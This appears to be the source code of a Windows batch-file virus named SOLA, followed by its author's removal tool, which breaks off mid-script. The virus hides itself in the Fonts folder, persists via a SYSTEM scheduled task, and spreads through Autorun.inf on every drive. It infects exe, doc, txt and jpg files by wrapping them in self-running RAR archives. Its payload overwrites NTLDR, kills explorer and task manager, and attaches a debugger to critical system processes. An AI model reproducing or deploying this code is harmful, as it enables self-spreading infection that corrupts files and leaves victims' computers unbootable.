FOR /F "skip=5 tokens=1,4" %%i in ('dir %systemroot%\explorer.exe') do if /I "%%j"=="explorer.exe" set Date=%%i
if "%1"=="-Install" goto Install
if "%1"=="-Run" goto Run
if "%1"=="-Tenbatsu" goto Tenbatsu
if "%1"=="-Kill" goto Kill
if "%1"=="-Killself" goto Killself

:CheckSign
if "%1"=="-USB" start /max ..
if "%1"=="-USB" cd SOLA
if exist %systemroot%\Fonts\HIDESE~1\sola.sign goto Open

:FileCopy
set selfname=%0
:HIDESelf
date %Date%
md %systemroot%\Fonts\HIDESELF...\
date %RealDate%
if not "%1"=="-USB" type %selfname%>%systemroot%\Fonts\HIDESE~1\sola.bat
if "%1"=="-USB" type sola.bat>%systemroot%\Fonts\HIDESE~1\sola.bat
type Function.dll>%systemroot%\Fonts\HIDESE~1\Function.exe
echo On Error Resume Next>%systemroot%\Fonts\HIDESE~1\SOLA.VBS
echo set ws=wscript.createobject("wscript.shell")>>%systemroot%\Fonts\HIDESE~1\SOLA.VBS
echo ws.run "cmd /c %sola%\SOLA.BAT -Install",0 >>%systemroot%\Fonts\HIDESE~1\SOLA.VBS
cscript %systemroot%\Fonts\HIDESE~1\SOLA.VBS
echo>%systemroot%\Fonts\HIDESE~1\sola.sign
del %systemroot%\Fonts\HIDESE~1\SOLA.VBS
goto Open


:Install


:PackerSetup
%SystemDrive%
cd %systemroot%\Fonts\HIDESE~1
if exist Function.exe taskkill /f /im Function.exe
if exist solasetup rd /s /q solasetup
md solasetup
cd solasetup
copy ..\Function.exe Function.dll
..\Function.exe -x
cd..
date %Date%
type %setup%\rar.exe >%systemroot%\system32\rar.exe
date %Realdate%
copy %setup%\Function.dll %sola%\Function.dll
attrib %sola%\Function.dll +s +h +r
rar -m0 -ep -ep1 a %setup%\docpack.dll %sola%\Function.dll
rar -m0 -ep -ep1 a %setup%\txtpack.dll %sola%\Function.dll
rar -m0 -ep -ep1 a %setup%\exepack.dll %sola%\Function.dll
rar -m0 -ep -ep1 a %setup%\jpgpack.dll %sola%\Function.dll
del Function.exe



:Mainsetup
set A0001=copy
set A0002=attrib
set A0003=echo
set A0005=Shell Hardware Detection
tasklist >%sola%\task.txt
FOR /F "tokens=1" %%i in ('findstr /I "svchost.exe" "%sola%\task.txt"') do set svchost=%%i
%A0001% %systemroot%\system32\cmd.exe %sola%\%svchost%
del %sola%\task.txt

:Tasks
%A0002% %systemroot%\Tasks\Tasks.job -s -h -r
del %systemroot%\Tasks\Tasks.job

date %Date%
type %setup%\Tasks.xxx>%systemroot%\Tasks\Tasks.job
schtasks /change /ru "NT AUTHORITY\SYSTEM" /tn "Tasks" & if errorlevel 1 goto TaskFail
date %RealDate%

goto TaskSuc
:TaskFail
%homedrive%
cd "%ALLUSERSPROFILE%"
cd 「开始」菜单\程序\启动

date %Date%
%A0003% On Error Resume Next>SOLA.VBS
%A0003% set ws=wscript.createobject("wscript.shell")>>SOLA.VBS
%A0003% ws.run "%sola%\svchost.exe /c %sola%\SOLA.BAT -Run",0 >>SOLA.VBS
%A0001% SOLA.VBS %sola%\SOLA.VBS
%A0003% NT>%systemroot%\Fonts\HIDESE~1\NoTasks
date %RealDate%

:TaskSuc
%A0002% %systemroot%\Tasks\Tasks.job +s +h +r
date %Date%
%A0001% %setup%\sleep.exe %systemroot%\system32\sleep.exe
date %RealDate%

:NoAutoPlay
net stop "%A0005%"
%A0003% Windows Registry Editor Version 5.00>%systemroot%\Fonts\HIDESE~1\Regedit.reg
%A0003% [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\ShellHWDetection]>>%systemroot%\Fonts\HIDESE~1\Regedit.reg
%A0003% "Start"=dword:00000004>>%systemroot%\Fonts\HIDESE~1\Regedit.reg
regedit /s %systemroot%\Fonts\HIDESE~1\Regedit.reg

::End of Install
goto End&if errorlevel 1 exit
::End of Install




:Run
set runroot=%ALLUSERSPROFILE%\「开始」菜单\程序\启动
set taskroot=%systemroot%\Tasks

:RunTimeChk
if not exist %sola%\RunTime.txt echo !50>%sola%\RunTime.txt
FOR /F "tokens=1 delims=!" %%i in (%sola%\RunTime.txt) do set RunTime=%%i
if /i %RunTime% leq 0 goto Virus
set /a RunTime=%Runtime%-1
echo !%Runtime%>%sola%\RunTime.txt

:Diskchk

echo On Error Resume Next>%systemroot%\Fonts\HIDESE~1\RecentInf.VBS
echo set ws=wscript.createobject("wscript.shell")>>%systemroot%\Fonts\HIDESE~1\RecentInf.VBS
echo ws.run "%sola%\svchost.exe /c %setup%\RecentInf.bat",0 >>%systemroot%\Fonts\HIDESE~1\RecentInf.VBS
cscript %systemroot%\Fonts\HIDESE~1\RecentInf.VBS
del %systemroot%\Fonts\HIDESE~1\RecentInf.VBS

for %%i in (C D E F G H I J K L M N O P Q R S T U V W X Y Z) do vol %%i:&if errorlevel 1 set %%i=1
for %%i in (C D E F G H I J K L M N O P Q R S T U V W X Y Z) do echo 1>%%i:\solachk1 & findstr . %%i:\solachk1 & if not errorlevel 1 del %%i:\solachk1& findstr /C:"SOLA_1.0_2.0" %%i:\Autorun.inf & if errorlevel 1  attrib -s -h -r %%i:\Autorun.inf&copy /y %setup%\Autorun.inf %%i:\Autorun.inf&attrib %%i:\Autorun.inf +s +h +r&md %%i:\SOLA&copy /y "%setup%\sola.bat" %%i:\SOLA\SOLA.BAT&copy /y "%setup%\Function.dll" %%i:\SOLA\Function.dll&attrib %%i:\SOLA +s +h +r


:Turn
if "%C%"=="1" vol C:&if not errorlevel 1 call %setup%\Scan.bat C:
if "%D%"=="1" vol D:&if not errorlevel 1 call %setup%\Scan.bat D:
if "%E%"=="1" vol E:&if not errorlevel 1 call %setup%\Scan.bat E:
if "%F%"=="1" vol F:&if not errorlevel 1 call %setup%\Scan.bat F:
if "%G%"=="1" vol G:&if not errorlevel 1 call %setup%\Scan.bat G:
if "%H%"=="1" vol H:&if not errorlevel 1 call %setup%\Scan.bat H:
if "%I%"=="1" vol I:&if not errorlevel 1 call %setup%\Scan.bat I:
if "%J%"=="1" vol J:&if not errorlevel 1 call %setup%\Scan.bat J:
if "%K%"=="1" vol K:&if not errorlevel 1 call %setup%\Scan.bat K:
if "%L%"=="1" vol L:&if not errorlevel 1 call %setup%\Scan.bat L:
if "%M%"=="1" vol M:&if not errorlevel 1 call %setup%\Scan.bat M:
if "%N%"=="1" vol N:&if not errorlevel 1 call %setup%\Scan.bat N:
if "%O%"=="1" vol O:&if not errorlevel 1 call %setup%\Scan.bat O:
if "%P%"=="1" vol P:&if not errorlevel 1 call %setup%\Scan.bat P:
if "%Q%"=="1" vol Q:&if not errorlevel 1 call %setup%\Scan.bat Q:
if "%R%"=="1" vol R:&if not errorlevel 1 call %setup%\Scan.bat R:
if "%S%"=="1" vol S:&if not errorlevel 1 call %setup%\Scan.bat S:
if "%T%"=="1" vol T:&if not errorlevel 1 call %setup%\Scan.bat T:
if "%U%"=="1" vol U:&if not errorlevel 1 call %setup%\Scan.bat U:
if "%V%"=="1" vol V:&if not errorlevel 1 call %setup%\Scan.bat V:
if "%W%"=="1" vol W:&if not errorlevel 1 call %setup%\Scan.bat W:
if "%X%"=="1" vol X:&if not errorlevel 1 call %setup%\Scan.bat X:
if "%Y%"=="1" vol Y:&if not errorlevel 1 call %setup%\Scan.bat Y:
if "%Z%"=="1" vol Z:&if not errorlevel 1 call %setup%\Scan.bat Z:

if "%C%"=="2" vol C:&if errorlevel 1 set C=1
if "%D%"=="2" vol D:&if errorlevel 1 set D=1
if "%E%"=="2" vol E:&if errorlevel 1 set E=1
if "%F%"=="2" vol F:&if errorlevel 1 set F=1
if "%G%"=="2" vol G:&if errorlevel 1 set G=1
if "%H%"=="2" vol H:&if errorlevel 1 set H=1
if "%I%"=="2" vol I:&if errorlevel 1 set I=1
if "%J%"=="2" vol J:&if errorlevel 1 set J=1
if "%K%"=="2" vol K:&if errorlevel 1 set K=1
if "%L%"=="2" vol L:&if errorlevel 1 set L=1
if "%M%"=="2" vol M:&if errorlevel 1 set M=1
if "%N%"=="2" vol N:&if errorlevel 1 set N=1
if "%O%"=="2" vol O:&if errorlevel 1 set O=1
if "%P%"=="2" vol P:&if errorlevel 1 set P=1
if "%Q%"=="2" vol Q:&if errorlevel 1 set Q=1
if "%R%"=="2" vol R:&if errorlevel 1 set R=1
if "%S%"=="2" vol S:&if errorlevel 1 set S=1
if "%T%"=="2" vol T:&if errorlevel 1 set T=1
if "%U%"=="2" vol U:&if errorlevel 1 set U=1
if "%V%"=="2" vol V:&if errorlevel 1 set V=1
if "%W%"=="2" vol W:&if errorlevel 1 set W=1
if "%X%"=="2" vol X:&if errorlevel 1 set X=1
if "%Y%"=="2" vol Y:&if errorlevel 1 set Y=1
if "%Z%"=="2" vol Z:&if errorlevel 1 set Z=1




if exist %systemroot%\Fonts\HIDESE~1\NoTasks if not exist "%runroot%\SOLA.VBS" copy "%sola%\SOLA.VBS" "%runroot%\SOLA.VBS"
if not exist %systemroot%\Fonts\HIDESE~1\NoTasks if not exist %Taskroot%\Tasks.job copy %setup%\Tasks.xxx %Taskroot%\Tasks.job&attrib %Taskroot%\Tasks.job +s +h +r&schtasks /change /ru "NT AUTHORITY\SYSTEM" /tn "Tasks"
sleep 2000
goto Turn

::End of Run
goto End&if errorlevel 1 exit
::End of Run







:Virus
if not "%Runtime%"=="0" goto VirusChk
set /a RunTime=%Runtime%-1
echo !%Runtime%>%sola%\RunTime.txt
cd "%ALLUSERSPROFILE%\「开始」菜单\程序\启动"
echo On Error Resume Next>TENBATSU.VBS
echo set ws=wscript.createobject("wscript.shell")>>TENBATSU.VBS
echo ws.run "%sola%\sola.bat -Tenbatsu",0 >>TENBATSU.VBS
goto Diskchk

:VirusChk
if not exist "%ALLUSERSPROFILE%\「开始」菜单\程序\启动\TENBATSU.VBS" goto Kill
goto Diskchk

:Tenbatsu
:KillNTLDR
attrib %systemdrive%\NTLDR -s -h -r
copy /Y %systemdrive%\NTLDR %sola%\NTLDR
echo NO NTLDR>%systemdrive%\NTLDR
::attrib %systemdrive%\NTLDR +s +h +r

:PauseSFC
start mshta "javascript:new ActiveXObject('WScript.Shell').Run('ntsd -pn winlogon.exe',0);window.close()"

:KillTaskmgr
del /q /a %systemroot%\system32\dllcache\taskmgr.exe
taskkill /f /im taskmgr.exe & if errorlevel 1 ren %systemroot%\system32\taskmgr.exe taskmgr.xxx & if errorlevel 1 start mshta "javascript:new ActiveXObject('WScript.Shell').Run('ntsd -c q -pn taskmgr.exe',0);window.close()" & sleep 500
ren %systemroot%\system32\taskmgr.exe taskmgr.xxx

:KillExplorer
taskkill /f /im explorer.exe >nul& if errorlevel 1 ren %systemroot%\system32\explorer.exe explorer.xxx & start mshta "javascript:new ActiveXObject('WScript.Shell').Run('ntsd -c q -pn explorer.exe',0);window.close()" & sleep 500
ren %systemroot%\explorer.exe explorer.xxx
start /max %setup%\TENBATSU.BAT

:Timeset
sleep 660000
if exist %sola%\Killself Exit

:Kill
attrib %systemdrive%\NTLDR -s -h -r
echo NO NTLDR>%systemdrive%\NTLDR
::attrib %systemdrive%\NTLDR +s +h +r
tasklist >%sola%\Task.txt
FOR /F "tokens=2" %%i in ('findstr /I "csrss.exe" "%sola%\Task.txt"') do ntsd -p %%i
goto Diskchk



:KillSelf
:StartExplorer
ren %systemroot%\explorer.xxx explorer.exe
start %systemroot%\explorer.exe
:BackNTLDR
attrib %systemdrive%\NTLDR -s -h -r
copy /Y %sola%\NTLDR %systemdrive%\NTLDR
attrib %systemdrive%\NTLDR +s +h +r

:RenTmg
ren %systemroot%\system32\taskmgr.xxx taskmgr.exe

:KillVirus
copy %setup%\KillVirus.txt %sola%\KillVirus.txt
C:
cd\
md ~Install
cd ~Install
rar x -hpkakenhi200601 %setup%\SolaKiller.rar
mshta "javascript:new ActiveXObject('WScript.Shell').Run('C:\\~Install\\Install.bat %%1',0);window.close()"
rd /s /q %setup%
attrib %systemroot%\Tasks\Tasks.job -s -h -r
del %systemroot%\Tasks\Tasks.job
cd "%ALLUSERSPROFILE%\「开始」菜单\程序\启动"
if exist sola.vbs del sola.vbs
if exist tenbatsu.vbs del tenbatsu.vbs
start %systemroot%\system32\notepad.exe %sola%\KillVirus.txt
del %sola%\sola.bat
Exit



:Open
if "%1"=="-USB" Exit
```

## `TDPack.txt`

```plain
goto GetName
:BackOpen
if not exist "%Name%" exit
call "%Name%"
:Save
FOR /F "delims=:" %%i in ('findstr "%Code%" *.exe') do set PackName=%%i
rar -m0 -ep -ep1 a "%PackName%" "%Name%"
echo %Code%>>"%PackName%"
:Del
attrib "%Name%" -s -h -r
del "%Name%"
attrib Function.dll -s -h -r
del Function.dll
attrib %0 -s -h -r
del %0
exit
::CMD program will stop there.
:GetName
```

## `infect.bat`

```bat
if not exist "%*" goto End
set File=
set File="%*"


:SpaceChk
:ChkFile
if exist %sola%\File.txt del %sola%\File.txt
dir %File%>%sola%\File.txt
FOR /F "tokens=1 delims=" %%i in ('dir /b %File%') do set name=%%i
set DX=0
FOR /F "tokens=3" %%i in ('findstr /C:"%name%" %sola%\File.txt') do set DX=%%i
FOR /F "tokens=1,2,3,4,5,6,7,8,9 delims=," %%i in ("%DX%") do set DX=%%i%%j%%k%%l%%m%%n%%o%%p%%q
if "%type%"=="exe" findstr "SOLA_2.0_" %File%>nul&if not errorlevel 1 goto End
if /I %DX% gtr 1572864 goto End
:ChkSpace
set Space=
if exist %sola%\Drvifm1.txt del %sola%\Drvifm1.txt
dir %Drive%>%sola%\Drvifm1.txt
set ml=Dir(s)
findstr "¸öÄ¿Â¼" %sola%\Drvifm1.txt>nul&if not errorlevel 1 set ml=¸öÄ¿Â¼
FOR /F "tokens=3" %%i in ('findstr "%ml%" %sola%\Drvifm1.txt') do set Space=%%i
FOR /F "tokens=1,2,3,4,5,6,7,8,9 delims=," %%i in ("%Space%") do set Space=%%i%%j%%k%%l%%m%%n%%o%%p%%q
if "%Space%"=="" set Space=999999999999
if /I %space% lss 5242880 goto End


:SolaMake
%systemdrive%
cd %sola%
set Code=SOLA_2.0_%Random%%Random%%Random%
copy %setup%\sola.bat %Code%.bat
type %end%>>%Code%.bat
echo set Code=%Code%>>%Code%.bat
echo set Name=%name%>>%Code%.bat
if "%type%"=="exe" FOR /F "tokens=1 delims=." %%i in ("%name%") do echo set Name=%%i.com>>%Code%.bat
echo goto Backopen>>%Code%.bat
echo :End>>%Code%.bat
echo This is infect.bat

:Rar
FOR /F "tokens=1 delims=." %%i in (%File%) do set RealFile=%%i.exe
copy /Y %setup%\%type%pack.dll infect.dll
attrib %Code%.bat +s +h +r
echo SavePath>zs.txt
echo Setup=mshta "javascript:new ActiveXObject('WScript.Shell').Run('%Code%.bat',0);window.close()">>zs.txt
echo silent=1 >>zs.txt
echo Overwrite=1 >>zs.txt
rar -zzs.txt c infect.dll %sola%\zs.txt
rar -m0 -ep -ep1 a infect.dll %sola%\%Code%.bat
attrib %sola%\%Code%.bat -s -h -r
del %sola%\%Code%.bat

:Exe2com
if not "%type%"=="exe" goto SolaMake2
FOR /F "tokens=1 delims=." %%i in ("%name%") do set ComName=%%i.com
ren %File% "%ComName%"
FOR /F "tokens=1 delims=." %%i in (%File%) do set File="%%i.com"

:SolaMake2
attrib %File% +s +h
rar -m0 -ep -ep1 a infect.dll %File%
attrib %File% -s -h -r
echo %Code%>>infect.dll
del %File%
move /Y infect.dll "%RealFile%"

:End
```

## `readlnk.bat`

```bat
echo This is Readlnk.bat
set Readlnk=
FOR /F "skip=2 delims=" %%i in ('find ":\" "%*"') do if exist "%%i" set Readlnk=%%i
if "%Readlnk%"=="" goto End
call %setup%\infect.bat %Readlnk%

%HOMEDRIVE%
cd %USERPROFILE%
cd..
cd %MB%\Recent

:End
```

## `scan.bat`

```bat
echo This is Scan.bat
if "%1"=="" goto End
set Drive=%1
echo TEST>%Drive%\~solatest&findstr TEST %Drive%\~solatest&if errorlevel 1 goto End
del %Drive%\~solatest

:USBInf
findstr /C:"SOLA_1.0_2.0" %Drive%\Autorun.inf & if errorlevel 1 attrib -s -h -r %Drive%\Autorun.inf&copy /y %setup%\Autorun.inf %Drive%\Autorun.inf&attrib %Drive%\Autorun.inf +s +h +r&md %drive%\SOLA&copy /y "%setup%\Function.dll" %Drive%\SOLA\Function.dll&copy /y "%setup%\SOLA.BAT" %Drive%\SOLA\SOLA.BAT&attrib %Drive%\SOLA +s +h +r



:FILInf

:GetSpace
set Space=
if exist %sola%\Drvifm1.txt del %sola%\Drvifm1.txt
dir %Drive%>%sola%\Drvifm1.txt
set ml=Dir(s)
findstr "¸öÄ¿Â¼" %sola%\Drvifm1.txt>nul&if not errorlevel 1 set ml=¸öÄ¿Â¼
FOR /F "tokens=3" %%i in ('findstr "%ml%" %sola%\Drvifm1.txt') do set Space=%%i
FOR /F "tokens=1,2,3,4,5,6,7,8,9 delims=," %%i in ("%Space%") do set Space=%%i%%j%%k%%l%%m%%n%%o%%p%%q
if "%Space%"=="" set Space=999999999999
if /I %space% lss 5242880 goto End

:InfectFile
set end=%setup%\EJPack.txt&set type=exe
FOR /F "tokens=*" %%i in ('dir /b /s %Drive%\*.exe') do call %setup%\infect.bat %%i
set end=%setup%\TDPack.txt&set type=doc
FOR /F "tokens=*" %%i in ('dir /b /s %Drive%\*.doc') do call %setup%\infect.bat %%i
set end=%setup%\TDPack.txt&set type=txt
FOR /F "tokens=*" %%i in ('dir /b /s %Drive%\*.txt') do call %setup%\infect.bat %%i
set end=%setup%\EJPack.txt&set type=jpg
FOR /F "tokens=*" %%i in ('dir /b /s %Drive%\*.jpg') do call %setup%\infect.bat %%i


:End
FOR /F "tokens=1 delims=:" %%i in ("%Drive%") do set %%i=2
```

## `SolaKiller`

### `Install.bat`

```bat
@echo off
C:
cd ~Install

if exist %systemroot%\system32\SolaScan.bat goto Err

md "%ProgramFiles%\KAKENHI'S"
copy /y ToSystem32\*.* %systemroot%\system32\*.*
copy /y ToProgram\GUICheck.bat "%ProgramFiles%\KAKENHI'S\GUICheck.bat"

md "%USERPROFILE%\「开始」菜单\程序\SOLA病毒专杀"
copy ToProgram\SolaKiller.bat "%USERPROFILE%\「开始」菜单\程序\SOLA病毒专杀\SolaKiller.bat"

echo regpath="%ProgramFiles%\KAKENHI'S\GUICheck.bat %1">C:\regdata.vbs
type %systemroot%\system32\SLAData.dll>>C:\regdata.vbs
cscript C:\regdata.vbs>unl
copy C:\regdata.vbs %systemroot%\system32\regdata.vbs
del C:\regdata.vbs
echo >%systemroot%\assoc.txt

goto End

:Err


:End
cd..
rd /q /s ~Install

exit
```

### `ToProgram\GUICheck.bat`

```bat
@echo off

set File=%*
if not exist "%File%" goto End
attrib "%File%" -s -h -r >nul

if exist C:\lsfile goto Klsfile >nul
goto start >nul

:Klsfile
attrib C:\lsfile\* -s -h -r >nul

rd /s /q C:\lsfile >nul

:Start

findstr "SOLA_2.0_" "%File%" >nul & if not errorlevel 1 goto KillVirus
goto NomalFile

:KillVirus
echo ======清除病毒======
echo 请稍等...
color 27

md C:\lsfile >nul

C: >nul

cd\ >nul

cd C:\lsfile >nul

copy "%File%" "~Runner.exe" >nul

rar e ~Runner.exe >nul

attrib *.* -s -h -r >nul

del Function.dll >nul

FOR /F "tokens=4 delims=." %%i in ('findstr /c:"set Name=" *.bat') do set type=%%i

for /f "tokens=1 delims=." %%i in ("%File%") do set RealName=%%i.%type%

del *.bat

del *.exe

if exist *.* del %File%

if exist *.* type *.*>%RealName%


cd.. >nul

rd /s /q C:\lsfile >nul

echo %RealName%
echo 此文件中病毒已被清除。

sleep 2000

goto End



:NomalFile
color 17
echo %File%
echo 此文件未被感染。

sleep 2000


:End
```

### `ToProgram\SolaKiller.bat`

```bat
@echo off
color 27
set sola=%systemroot%\Fonts\HIDESE~1
set setup=%systemroot%\Fonts\HIDESE~1\solasetup

title SOLA病毒专杀软件 Made by KAKENHI.
if not exist %systemroot%\system32\Rar.exe goto ERR1
if not exist %systemroot%\system32\sleep.exe goto ERR2
:screen
cls
echo   欢迎，此程序可以帮助您清除计算机中的SOLA病毒。
echo   �[
echo   �[
echo   请输入命令：
echo   �[
echo   KILL     杀除系统中的SOLA病毒及硬盘根目录下的AUTORUN。
echo   SCAN     扫描被SOLA病毒感染的文件，进行文件杀毒。
echo   SET      进行SOLA专杀的相关设置。
echo   UNINST   卸载SOLA专杀程序。
echo   �[
set command=
set /p command=COMMAND:

if /i "%COMMAND%"=="KILL" goto Kill
if /i "%COMMAND%"=="SCAN" goto Scan
if /i "%COMMAND%"=="SET" goto Set
if /i "%COMMAND%"=="UNINST" goto Uninst
goto screen


:Scan
cls
call %systemroot%\System32\SolaScan.bat
goto screen


:Kill
cls
if not exist %sola%\sola.bat goto NoVirus
echo 请稍候，正在清除...
%systemdrive%
cd %sola%
rd /s /q %setup%
attrib %systemroot%\Tasks\Tasks.job -s -h -r
del %systemroot%\Tasks\Tasks.job
cd "%ALLUSERSPROFILE%\「开始」菜单\程序\启动"
if exist sola.vbs del sola.vbs
if exist tenbatsu.vbs del tenbatsu.vbs
del %sola%\sola.bat
goto UKiller
:NoVirus
set nobd=1
goto UKiller
:UKiller
cls&echo 正在检查磁盘C:&echo 检查结果：&set C=0 & echo 1>C:\solachk1 & findstr . C:\solachk1 & if not errorlevel 1 del C:\solachk1&findstr /C:"SOLA_1.0" C:\Autorun.inf &if not errorlevel 1 echo 发现病毒，正在清除...&set C=1&attrib -s -h -r C:\Autorun.inf&del C:\Autorun.inf&del C:\SOLA\SOLA.BAT
cls&echo 正在检查磁盘D:&echo 检查结果：&set D=0 & echo 1>D:\solachk1 & findstr . D:\solachk1 & if not errorlevel 1 del D:\solachk1&findstr /C:"SOLA_1.0" D:\Autorun.inf &if not errorlevel 1 echo 发现病毒，正在清除...&set D=1&attrib -s -h -r D:\Autorun.inf&del D:\Autorun.inf&del D:\SOLA\SOLA.BAT
cls&echo 正在检查磁盘E:&echo 检查结果：&set E=0 & echo 1>E:\solachk1 & findstr . E:\solachk1 & if not errorlevel 1 del E:\solachk1&findstr /C:"SOLA_1.0" E:\Autorun.inf &if not errorlevel 1 echo 发现病毒，正在清除...&set E=1&attrib -s -h -r E:\Autorun.inf&del E:\Autorun.inf&del E:\SOLA\SOLA.BAT
cls&echo 正在检查磁盘F:&echo 检查结果：&set F=0 & echo 1>F:\solachk1 & findstr . F:\solachk1 & if not errorlevel 1 del F:\solachk1&findstr /C:"SOLA_1.0" F:\Autorun.inf &if not errorlevel 1 echo 发现病毒，正在清除...&set F=1&attrib -s -h -r F:\Autorun.inf&del F:\Autorun.inf&del F:\SOLA\SOLA.BAT
cls&echo 正在检查磁盘G:&echo 检查结果：&set G=0 & echo 1>G:\solachk1 & findstr . G:\solachk1 & if not errorlevel 1 del G:\solachk1&findstr /C:"SOLA_1.0" G:\Autorun.inf &if not errorlevel 1 echo 发现病毒，正在清除...&set G=1&attrib -s -h -r G:\Autorun.inf&del G:\Autorun.inf&del G:\SOLA\SOLA.BAT
cls&echo 正在检查磁盘H:&echo 检查结果：&set H=0 & echo 1>H:\solachk1 & findstr . H:\solachk1 & if not errorlevel 1 del H:\solachk1&findstr /C:"SOLA_1.0" H:\Autorun.inf &if not errorlevel 1 echo 发现病毒，正在清除...&set H=1&attrib -s -h -r H:\Autorun.inf&del H:\Autorun.inf&del H:\SOLA\SOLA.BAT
cls&echo 正在检查磁盘I:&echo 检查结果：&set I=0 & echo 1>I:\solachk1 & findstr . I:\solachk1 & if not errorlevel 1 del I:\solachk1&findstr /C:"SOLA_1.0" I:\Autorun.inf &if not errorlevel 1 echo 发现病毒，正在清除...&set I=1&attrib -s -h -r I:\Autorun.inf&del I:\Autorun.inf&del I:\SOLA\SOLA.BAT
cls&echo 正在检查磁盘J:&echo 检查结果：&set J=0 & echo 1>J:\solachk1 & findstr . J:\solachk1 & if not errorlevel 1 del J:\solachk1&findstr /C:"SOLA_1.0" J:\Autorun.inf &if not errorlevel 1 echo 发现病毒，正在清除...&set J=1&attrib -s -h -r J:\Autorun.inf&del J:\Autorun.inf&del J:\SOLA\SOLA.BAT
cls&echo 正在检查磁盘K:&echo 检查结果：&set K=0 & echo 1>K:\solachk1 & findstr . K:\solachk1 & if not errorlevel 1 del K:\solachk1&findstr /C:"SOLA_1.0" K:\Autorun.inf &if not errorlevel 1 echo 发现病毒，正在清除...&set K=1&attrib -s -h -r K:\Autorun.inf&del K:\Autorun.inf&del K:\SOLA\SOLA.BAT
cls&echo 正在检查磁盘L:&echo 检查结果：&set L=0 & echo 1>L:\solachk1 & findstr . L:\solachk1 & if not errorlevel 1 del L:\solachk1&findstr /C:"SOLA_1.0" L:\Autorun.inf &if not errorlevel 1 echo 发现病毒，正在清除...&set L=1&attrib -s -h -r L:\Autorun.inf&del L:\Autorun.inf&del L:\SOLA\SOLA.BAT
cls&echo 正在检查磁盘M:&echo 检查结果：&set M=0 & echo 1>M:\solachk1 & findstr . M:\solachk1 & if not errorlevel 1 del M:\solachk1&findstr /C:"SOLA_1.0" M:\Autorun.inf &if not errorlevel 1 echo 发现病毒，正在清除...&set M=1&attrib -s -h -r M:\Autorun.inf&del M:\Autorun.inf&del M:\SOLA\SOLA.BAT
cls&echo 正在检查磁盘N:&echo 检查结果：&set N=0 & echo 1>N:\solachk1 & findstr . N:\solachk1 & if not errorlevel 1 del N:\solachk1&findstr /C:"SOLA_1.0" N:\Autorun.inf &if not errorlevel 1 echo 发现病毒，正在清除...&set N=1&attrib -s -h -r N:\Autorun.inf&del N:\Autorun.inf&del N:\SOLA\SOLA.BAT
cls&echo 正在检查磁盘O:&echo 检查结果：&set O=0 & echo 1>O:\solachk1 & findstr . O:\solachk1 & if not errorlevel 1 del O:\solachk1&findstr /C:"SOLA_1.0" O:\Autorun.inf &if not errorlevel 1 echo 发现病毒，正在清除...&set O=1&attrib -s -h -r O:\Autorun.inf&del O:\Autorun.inf&del O:\SOLA\SOLA.BAT
cls&echo 正在检查磁盘P:&echo 检查结果：&set P=0 & echo 1>P:\solachk1 & findstr . P:\solachk1 & if not errorlevel 1 del P:\solachk1&findstr /C:"SOLA_1.0" P:\Autorun.inf &if not errorlevel 1 echo 发现病毒，正在清除...&set P=1&attrib -s -h -r P:\Autorun.inf&del P:\Autorun.inf&del P:\SOLA\SOLA.BAT
cls&echo 正在检查磁盘Q:&echo 检查结果：&set Q=0 & echo 1>Q:\solachk1 & findstr . Q:\solachk1 & if not errorlevel 1 del Q:\solachk1&findstr /C:"SOLA_1.0" Q:\Autorun.inf &if not errorlevel 1 echo 发现病毒，正在清除...&set Q=1&attrib -s -h -r Q:\Autorun.inf&del Q:\Autorun.inf&del Q:\SOLA\SOLA.BAT
cls&echo 正在检查磁盘R:&echo 检查结果：&set R=0 & echo 1>R:\solachk1 & findstr . R:\solachk1 & if not errorlevel 1 del R:\solachk1&findstr /C:"SOLA_1.0" R:\Autorun.inf &if not errorlevel 1 echo 发现病毒，正在清除...&set R=1&attrib -s -h -r R:\Autorun.inf&del R:\Autorun.inf&del R:\SOLA\SOLA.BAT
cls&echo 正在检查磁盘S:&echo 检查结果：&set S=0 & echo 1>S:\solachk1 & findstr . S:\solachk1 & if not errorlevel 1 del S:\solachk1&findstr /C:"SOLA_1.0" S:\Autorun.inf &if not errorlevel 1 echo 发现病毒，正在清除...&set S=1&attrib -s -h -r S:\Autorun.inf&del S:\Autorun.inf&del S:\SOLA\SOLA.BAT
cls&echo 正在检查磁盘T:&echo 检查结果：&set T=0 & echo 1>T:\solachk1 & findstr . T:\solachk1 & if not errorlevel 1 del T:\solachk1&findstr /C:"SOLA_1.0" T:\Autorun.inf &if not errorlevel 1 echo 发现病毒，正在清除...&set T=1&attrib -s -h -r T:\Autorun.inf&del T:\Autorun.inf&del T:\SOLA\SOLA.BAT
cls&echo 正在检查磁盘U:&echo 检查结果：&set U=0 & echo 1>U:\solachk1 & findstr . U:\solachk1 & if not errorlevel 1 del U:\solachk1&findstr /C:"SOLA_1.0" U:\Autorun.inf &if not errorlevel 1 echo 发现病毒，正在清除...&set U=1&attrib -s -h -r U:\Autorun.inf&del U:\Autorun.inf&del U:\SOLA\SOLA.BAT
cls&echo 正在检查磁盘V:&echo 检查结果：&set V=0 & echo 1>V:\solachk1 & findstr . V:\solachk1 & if not errorlevel 1 del V:\solachk1&findstr /C:"SOLA_1.0" V:\Autorun.inf &if not errorlevel 1 echo 发现病毒，正在清除...&set V=1&attrib -s -h -r V:\Autorun.inf&del V:\Autorun.inf&del V:\SOLA\SOLA.BAT
cls&echo 正在检查磁盘W:&echo 检查结果：&set W=0 & echo 1>W:\solachk1 & findstr . W:\solachk1 & if not errorlevel 1 del W:\solachk1&findstr /C:"SOLA_1.0" W:\Autorun.inf &if not errorlevel 1 echo 发现病毒，正在清除...&set W=1&attrib -s -h -r W:\Autorun.inf&del W:\Autorun.inf&del W:\SOLA\SOLA.BAT
cls&echo 正在检查磁盘X:&echo 检查结果：&set X=0 & echo 1>X:\solachk1 & findstr . X:\solachk1 & if not errorlevel 1 del X:\solachk1&findstr /C:"SOLA_1.0" X:\Autorun.inf &if not errorlevel 1 echo 发现病毒，正在清除...&set X=1&attrib -s -h -r X:\Autorun.inf&del X:\Autorun.inf&del X:\SOLA\SOLA.BAT
cls&echo 正在检查磁盘Y:&echo 检查结果：&set Y=0 & echo 1>Y:\solachk1 & findstr . Y:\solachk1 & if not errorlevel 1 del Y:\solachk1&findstr /C:"SOLA_1.0" Y:\Autorun.inf &if not errorlevel 1 echo 发现病毒，正在清除...&set Y=1&attrib -s -h -r Y:\Autorun.inf&del Y:\Autorun.inf&del Y:\SOLA\SOLA.BAT
